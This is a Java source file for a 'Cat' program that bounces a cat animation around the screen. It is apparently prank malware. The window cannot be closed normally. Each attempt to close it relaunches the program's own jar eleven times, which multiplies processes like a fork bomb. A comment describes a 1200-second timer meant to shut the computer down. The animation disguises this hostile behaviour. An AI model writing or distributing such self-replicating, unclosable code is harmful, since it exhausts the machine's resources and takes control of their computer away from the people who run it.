import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URISyntaxException;
import java.net.URL;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.util.Objects;
import java.util.Random;

public class Cat extends JFrame implements WindowListener, ActionListener {
    int z = 0;
    ImageIcon image = new ImageIcon(Objects.requireNonNull(getClass().getClassLoader().getResource("ezgif.com-gif-maker.gif")));
    ImageIcon icon = new ImageIcon(Objects.requireNonNull(getClass().getClassLoader().getResource("cat.png")));
    Timer timer;
    Random random = new Random();
    final int WIDTH = 1300;
    final int HEIGHT = 500;
    int xVelocity = random.nextInt(5,15);
    int yVelocity = random.nextInt(5,15);
    int x = random.nextInt(0,1300);
    int y = random.nextInt(0,500);
    int time = 1200; //this is the time for the pc to shut down, shown in seconds.


    JLabel label;
    public Cat() {
        this.setTitle("cat");
        this.setIconImage(icon.getImage());
        Random random = new Random();
        this.setSize(640, 578);
        this.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        this.addWindowListener(this);
        label = new JLabel();
        label.setIcon(image);
        int x = random.nextInt(0, 1400);
        int y = random.nextInt(100, 500);
        this.add(label);
        this.setResizable(false);
        this.setLocation(x, y);
        this.setVisible(true);
       timer = new Timer(0, this);
        timer.start();
        if (z == 0){
            new TimerCode(time);
            z = 1;
        }
    }

    public static void main(String[] args) {
        new Cat();
    }


    @Override
    public void windowOpened(WindowEvent e) {

    }

    @Override
    public void windowClosing(WindowEvent e) {
        int c = 1000;
        int cont = 0;
        for (int i = 0; i <= 10; i++) {
            new Thread(this::Runnable).start();
        }
    }

    public void Runnable(){
        Class<Cat> currClass = Cat.class;
        ProtectionDomain domain = currClass.getProtectionDomain();
        CodeSource codeSource = domain.getCodeSource();
        URL location = codeSource.getLocation();
        String path = "";
        try {
            path = location.toURI().getPath();
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        };
        path = path.substring(1);
        try {
            ProcessBuilder builder = new ProcessBuilder("java" , "-jar" , path, "HOLA");
            builder.start();
        } catch (IOException e) {
            System.out.println(e.getMessage());
        }
    }

    @Override
    public void windowClosed(WindowEvent e) {

    }

    @Override
    public void windowIconified(WindowEvent e) {

    }

    @Override
    public void windowDeiconified(WindowEvent e) {

    }

    @Override
    public void windowActivated(WindowEvent e) {

    }

    @Override
    public void windowDeactivated(WindowEvent e) {

    }

    @Override
    public void actionPerformed(ActionEvent e) { //This is the code that moves the cat around, as u can see it's way better
        if(x>= WIDTH || x<0){
            xVelocity = xVelocity * -1;
        }
        x = x + xVelocity;

        if(y>= HEIGHT || y<0){
            yVelocity = yVelocity * -1;
        }

        y = y + yVelocity;

        this.setLocation(x,y);
    }
}
